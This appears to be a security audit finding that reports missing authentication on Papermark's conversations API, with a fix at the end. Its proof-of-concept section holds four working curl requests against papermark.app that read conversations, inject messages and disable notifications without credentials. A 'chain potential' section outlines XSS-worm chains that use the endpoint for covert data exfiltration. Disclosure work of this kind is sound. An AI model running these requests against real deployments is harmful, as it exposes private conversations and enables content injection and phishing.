# Finding: Conversations API — Zero Authentication on All Handlers

## Severity
CRITICAL

## CVSS Estimate
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1

## Affected Code
- **File:** `ee/features/conversations/api/conversations-route.ts` (lines 1-301, all 4 handlers)
- **File:** `pages/api/conversations/[[...conversations]].ts` (lines 1-10, thin passthrough)
- **Endpoint:** `GET/POST /api/conversations/**`
- **Routes:** GET `/` (list conversations), POST `/` (create conversation), POST `/messages` (add message), POST `/notifications` (toggle notifications)

## Description
The conversations catch-all route at `/api/conversations/**` has four handlers — GET list, POST create, POST messages, and POST notifications — and **none perform any authentication**. There is no `getServerSession()` call, no token check, no API key validation. The `viewerId` parameter is accepted from query parameters or request body with zero server-side verification that the caller owns that viewer identity.

The adjacent file `team-conversations-route.ts` demonstrates the correct pattern with `getServerSession()` on every handler, making this clearly an auth gap from a missed implementation pass.

The `middleware.ts:49` explicitly excludes `/api/*` from middleware processing, so there is no defense-in-depth layer either. The endpoint is fully internet-facing.

## Proof of Concept
1. **List conversations for any dataroom/viewer pair:**
   ```bash
   curl "https://papermark.app/api/conversations?dataroomId=dr_cuid&viewerId=v_cuid"
   ```
   No authentication required. Returns all conversations and messages for that pair.

2. **Create a conversation as any viewer:**
   ```bash
   curl -X POST "https://papermark.app/api/conversations" \
     -H "Content-Type: application/json" \
     -d '{"dataroomId":"dr_cuid","viewId":"v_cuid","viewerId":"any_viewer","documentId":"doc_cuid"}'
   ```

3. **Add messages to any conversation:**
   ```bash
   curl -X POST "https://papermark.app/api/conversations/messages" \
     -H "Content-Type: application/json" \
     -d '{"conversationId":"conv_cuid","viewerId":"any_viewer","content":"Injected message"}'
   ```

4. **Toggle notifications for any participant:**
   ```bash
   curl -X POST "https://papermark.app/api/conversations/notifications" \
     -H "Content-Type: application/json" \
     -d '{"conversationId":"conv_cuid","viewerId":"victim_viewer","enabled":false}'
   ```

## Impact
An unauthenticated attacker can:
- List all conversations and messages for any `dataroomId`+`viewerId` pair (data extraction)
- Create conversations under any viewer identity (data injection into PostgreSQL)
- Add messages to any conversation (content injection)
- Toggle notification preferences for any participant (denial of notification)
- Trigger `sendConversationTeamMemberNotificationTask` via Trigger.dev to send email notifications to team members (phishing via trusted channel)

## Evidence
```typescript
// conversations-route.ts:1-14 — imports do NOT include next-auth
import { NextApiRequest, NextApiResponse } from "next";
// ... prisma, conversationService, messageService ...
// *** NO next-auth imports, NO getServerSession ***

// Line 21-23: GET / — viewerId taken from query params, zero validation
const { dataroomId, viewerId } = req.query as { dataroomId?: string; viewerId?: string };

// Line 78-85: POST / — viewerId taken from body
const { dataroomId, viewId, viewerId, documentId, pageNumber, ...data } = req.body;

// Contrast: team-conversations-route.ts:40-43 — correct pattern
const session = await getServerSession(req, res, authOptions);
if (!session) { return res.status(401).json({ error: "Unauthorized" }); }
```

## Methodology
- **First found by:** Structural Analysis (01-structural-analysis.md) — Finding 1
- **Confirmed by:** SAST synthesis (02-synthesized-sast.md S-001)
- **Validated by:** Custom semgrep rule `papermark-no-auth-prisma-write` matched (32 findings across codebase)
- **Also missed by:** AI SAST (false negative) and stock semgrep rules

## Chain Potential
**Chainable.** This finding is the data-exfiltration backend for:
- **Chain 1 (XSS Worm):** Stored XSS payload calls `GET /api/conversations` from victim's session to extract conversation data
- **Chain 3 (Zod Recon → PII Extraction):** After Zod schema disclosure, attacker targets this endpoint with precisely crafted IDs
- **Chain 5 (EOL Middleware Bypass):** `.rsc` bypass enables access to this and other unprotected endpoints
- **Chain 11 (CSP Amplifier):** Zero-detection XSS worm uses this endpoint for covert data exfiltration

## Remediation
Add `getServerSession()` to all four handlers in `conversations-route.ts`, following the pattern established in `team-conversations-route.ts`. Validate that the requesting user or viewer identity is authorized to access the requested dataroom/viewer data.
